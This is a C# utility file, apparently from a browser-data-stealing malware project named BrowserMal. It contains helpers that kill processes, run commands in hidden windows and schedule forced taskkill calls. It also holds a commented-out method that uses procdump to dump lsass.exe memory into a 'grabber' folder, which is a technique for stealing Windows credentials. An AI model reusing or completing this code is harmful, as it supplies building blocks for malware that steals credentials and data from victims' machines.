using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace BrowserMal.Util
{
    public class ProcessUtil
    {
        public static void KillProcess(string name)
        {
            Process[] processes = Process.GetProcessesByName(name);

            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch { }
            }
        }

        public static string ConvertToUTF8(string value) => Encoding.UTF8.GetString(Encoding.Default.GetBytes(value));

        public static List<string> ProcessInvoker(string fileName, string arguments, bool wait, bool createNoWindow)
        {
            List<string> list = new List<string>();

            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Normal,
                    FileName = fileName,
                    Arguments = arguments,
                    CreateNoWindow = createNoWindow,
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                }
            };

            process.Start();

            while (!process.StandardOutput.EndOfStream)
                list.Add(ConvertToUTF8(process.StandardOutput.ReadLine()));

            if (wait)
                process.WaitForExit();

            return list;
        }

        public static void KillProcessDelayed(int seconds, string processName)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = $"/c timeout /t {seconds} >NUL && taskkill /F /IM {processName} /T"
            };

            try
            {
                Process.Start(processInfo);
            }
            catch { }
        }

        /*public static void DumpLssac()
        {
            Enumerate.ProcessStarter("\"C:\\Users\\milto\\Downloads\\Procdump\\procdump64.exe\" -accepteula -r -ma lsass.exe \"C:\\Users\\milto\\OneDrive\\Ambiente de Trabalho\\grabber\\lsass.dmp\"", "", true, true);
        }*/
    }
}
